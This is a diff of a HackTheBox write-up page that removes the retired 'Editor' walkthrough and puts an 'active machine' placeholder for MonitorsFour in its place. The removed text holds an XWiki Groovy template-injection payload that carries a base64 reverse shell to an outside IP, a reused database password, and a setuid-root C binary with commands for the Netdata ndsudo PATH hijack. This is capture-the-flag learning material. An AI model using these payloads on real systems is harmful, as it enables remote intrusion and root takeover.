@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="index, follow">
-    <title>Editor - Hexicon Archives</title>
+    <meta name="robots" content="noindex">
+    <title>MonitorsFour - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
-    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Editor.html" />
+    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/MonitorsFour.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Detailed writeup for Editor machine from HackTheBox - Easy difficulty level">
-    <meta name="keywords" content="HackTheBox, Editor, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
+    <meta name="description" content="Restricted writeup for MonitorsFour machine from HackTheBox - Easy difficulty level">
+    <meta name="keywords" content="HackTheBox, MonitorsFour, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
     <header>
@@ -56,126 +56,19 @@
     <div class="backdrop"></div>
     
     <main class="container writeup-content">
-        <h1 class="writeup-title">Editor</h1>
+        <h1 class="writeup-title">MonitorsFour</h1>
         <div class="writeup-metadata">
             <span class="difficulty easy">Easy</span>
-            <span class="date">December 6, 2025</span>
+            <span class="date">Active machine</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="pwned" src="../images/Editor/pwned.png" /></p>
-<p>Editor was an easy-difficulty Linux box featuring an unauthenticated remote code execution vulnerability in XWiki and a privilege escalation through PATH hijacking in Netdata's plugin system.
-Initial access was gained by exploiting CVE-2025-24893, a Server-Side Template Injection (SSTI) vulnerability in XWiki 15.10.8's SolrSearchMacro, which improperly handled Groovy expressions in search queries.
-I crafted a malicious URL-encoded payload that changed the media type to RSS (the only format that interprets Groovy macros as executable code) and injected a reverse shell command.
-The payload broke out of existing macros with }}}, used {{async async=false}} for synchronous execution, and executed a base64-encoded bash reverse shell through Groovy's .execute().text methods, using brace expansion ({echo,b64string}|{base64,-d}|{bash,-i}) to bypass space restrictions. This granted a shell as the xwiki user inside a Docker container.</p>
-<p>I enumerated the XWiki Java application's configuration files and discovered database credentials (theEd1t0rTeam99) in /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml. Testing for credential reuse against the oliver user account via SSH succeeded, providing access to the host system and the user flag.</p>
-<p>I identified an outdated Netdata monitoring service (v1.45.2) running on port 19999 and exploited CVE-2024-32019, which allows privilege escalation through PATH hijacking in the ndsudo binary.
-I compiled a malicious C binary that explicitly set GID, EUID, and UID to 0 using setgid(), seteuid(), and setuid() before calling execl() to spawn a privileged bash shell.
-After naming this binary nvme and placing it in /tmp, I modified the PATH environment variable with export PATH=/tmp/:$PATH and executed /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list, which triggered the malicious binary and granted root access.</p>
-<h1>User Flag</h1>
-<p><img alt="nmap" src="../images/Editor/nmap.png" /></p>
-<p>Initial nmap scan reveals 3 open ports, SSH on 22, and websites on 80 and 8080.</p>
-<h2>Website enumeration</h2>
-<p><img alt="webpage" src="../images/Editor/webpage.png" /></p>
-<p>I can download a .deb package and a Windows executable of <code>simplistcode</code>. If this is used somewhere on the website, I'll analyze it to look for vulnerabilities. For now, I'll keep looking.</p>
-<p>The <code>Docs</code> button leads to a <code>wiki</code> subdomain.</p>
-<p><img alt="wiki" src="../images/Editor/wiki.png" /></p>
-<p>At the bottom of the page, a version number <code>XWiki Debian 15.10.8</code> is revealed. Searching for CVEs related to this version led me to <code>CVE-2025-24893</code>, an unauthenticated RCE vulnerability caused by improper handling of Groovy expressions by the SolrSearchMacro inside the search queries.</p>
-<p><code>https://www.offsec.com/blog/cve-2025-24893/</code></p>
-<p>And the OffSec article links to a GitHub advisory and  PoC for this vulnerability.</p>
-<p><code>https://github.com/advisories/GHSA-rr6p-3pfg-562j</code></p>
-<p><code>https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py</code></p>
-<h2>Understanding the SSTI vulnerability</h2>
-<p>In the PoC, I can see the payload clearly. </p>
-<pre class="codehilite"><code>SolrSearch?media=rss&amp;text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
-</code></pre>
-
-<p>This being injected into the URL. After URL-Decoding it, this is the result:</p>
-<p><code>SolrSearch?media=rss&amp;text=}}}{{async async=false}}{{groovy}}println("cat /etc/passwd".execute().text){{/groovy}}{{/async}}</code></p>
-<p>The payload breaks down as follows:</p>
-<pre class="codehilite"><code>}}} - Closes any existing XWiki macros
-
-{{async async=false}} - Forces synchronous execution (ensures command completes before page renders)
-
-{{groovy}}...{{/groovy}} - XWiki macro that executes Groovy code
-
-println(&quot;cat /etc/passwd&quot;.execute().text) - The actual exploit:
-
-.execute() - Spawns a new process (similar to Runtime.exec() in Java)
-
-.text - Reads stdout from that process as a string
-
-println() - Outputs it to the RSS feed
-</code></pre>
-
-<p>To turn this into a reverse shell, I'll have to change the cat command into a proper reverse shell payload. This step took me quite a while, but eventually I got a connection back.</p>
-<p><code>%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Becho,YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMzQvOTAwMSAgMD4mMScK%7D%7C%7Bbase64,-d%7D%7C%7Bbash,-i%7D%22.execute()%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D</code>.</p>
-<p><img alt="feed" src="../images/Editor/feed.png" /></p>
-<p>I wrapped each component of the command after the echo into a curly brace. This avoids using spaces, as bash will naturally expand the braces into proper commands. For example, {echo,b64command} will become <code>echo b64command</code></p>
-<p>The full reverse shell command is: <code>bash -c  echo &lt;B64STRING&gt;|base64 -d|bash -i</code></p>
-<p><img alt="shell" src="../images/Editor/shell.png" /></p>
-<h2>Exploring the container</h2>
-<p><img alt="home" src="../images/Editor/home.png" /></p>
-<p>There is a Docker container running on the box, and the only user with a home directory is Oliver. This is my next target.</p>
-<p>Xwiki is a Java application, and it has the user login functionality. As such, it must have a database. Many Java apps use Hibernate ORM to connect with MySQL, and so is the case for Xwiki.</p>
-<p><code>https://www.xwiki.org/xwiki/bin/view/Documentation/AdminGuide/Performances/Database%20Administration/</code></p>
-<p><code>find / -type f -name "*.cfg*" 2&gt;/dev/null</code></p>
-<p>Looking for any .cfg files on the box, I see 3 interesting entries related to Xwiki.</p>
-<p><img alt="cfg" src="../images/Editor/cfg.png" /></p>
-<p>XML files often contain credentials, so I'll start with checking that one.</p>
-<p><img alt="creds" src="../images/Editor/creds.png" /></p>
-<p><code>? | theEd1t0rTeam99</code></p>
-<p>I'll test this password for credentials reuse against Oliver with SSH.</p>
-<p><img alt="user" src="../images/Editor/user.png" /></p>
-<h1>Root Flag</h1>
-<p><img alt="listening" src="../images/Editor/listening.png" /></p>
-<p>There are 3 unusually high active ports, 33060, 37881, and 19999. The first two return errors, but the last one leads to a working application.</p>
-<p><img alt="netdata" src="../images/Editor/netdata.png" /></p>
-<p><code>Netdata</code> is an open-source monitoring tool that grants insight into the health of and use of components.</p>
-<h2>PATH hijack attack</h2>
-<p>I can see a warning about a missing update on the upper portion of the screen.</p>
-<p><img alt="update" src="../images/Editor/update.png" /></p>
-<p>The editor box runs an older version of Netdata <code>v1.45.2</code>. A quick search online led me to <code>CVE-2024-32019</code> and a GitHub advisory.</p>
-<p><code>https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93</code></p>
-<p><img alt="plugins" src="../images/Editor/plugins.png" /></p>
-<p>The netdata plugins are located under <code>/opt/netdata/usr/libexec/netdata/plugins.d/</code>. Running ndsudo with the help flag reveals which executable each command uses.</p>
-<p>GitHub advisory suggests replacing the <code>nvme</code> bin, and that's what I'll do. However, directly calling bash commands with <code>-p</code> (preserves the SUID bit) did not work as intended here. It might have been due to certain security options being used, or the process dropping the SUID bit, regardless, but there is a different way to force the UID to my desired value.</p>
-<pre class="codehilite"><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-
-int main() {
-    if (setgid(0) != 0) {
-        perror(&quot;setgid&quot;);
-        return 1;
-    }
-
-    if (seteuid(0) != 0) {
-        perror(&quot;seteuid&quot;);
-        return 1;
-    }
-
-    if (setuid(0) != 0) {
-        perror(&quot;setuid&quot;);
-        return 1;
-    }
-
-    printf(&quot;UID=%d EUID=%d GID=%d\n&quot;, getuid(), geteuid(), getgid());
-
-    execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;, &quot;-i&quot;, NULL);
-    perror(&quot;execl&quot;);
-    return 1;
-}
-</code></pre>
-
-<p>This binary will first set the GID(Group ID), EUID(Effective User ID), and the UID(User ID) to 0(root), then display back the values, and finally, it'll replace the <code>nvme-list</code> process with the new /bin/bash call with execl. Since it will be executed as root, the newly spawned bash shell should have root permissions.</p>
-<p>The malicious <code>nvme</code> binary will be placed under /tmp. I'll add that directory to the PATH like this.</p>
-<p><code>export PATH=/tmp/:$PATH</code></p>
-<p><code>/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list</code></p>
-<p><img alt="root" src="../images/Editor/root.png" /></p>
-<p>Rooted!</p>
+                <p><img alt="pwned" src="../images/MonitorsFour/pwned.png" /></p>
+<p>MonitorsFour is an ACTIVE machine!</p>
+<p>This write-up will go live once MonitorsFour retires.</p>
+<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
             </div>
             
             <div class="toc-sidebar">
@@ -252,7 +145,7 @@ int main() {
                     link.textContent = data.title;
                     
                     // Highlight current machine
-                    if (data.title === "Editor") {
+                    if (data.title === "MonitorsFour") {
                         link.classList.add('active');
                     }
                     
